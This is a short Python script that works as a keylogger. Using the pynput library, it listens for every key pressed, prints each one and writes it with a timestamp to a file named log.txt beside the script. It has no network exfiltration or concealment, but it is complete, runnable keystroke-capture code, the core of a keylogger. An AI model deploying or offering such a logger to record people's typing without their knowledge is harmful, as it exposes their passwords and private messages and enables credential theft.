from pynput.keyboard import Key, Listener
import logging
from pathlib import Path


log_directory = Path(__file__).resolve().parent

log_file = log_directory / "log.txt"

logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s >> %(message)s"
)

logging.info("Application started")
logging.info("Test message")

def on_press(key):
    print(key)
    x = logging.info(key)
with Listener(on_press=on_press) as listener:
    listener.join()
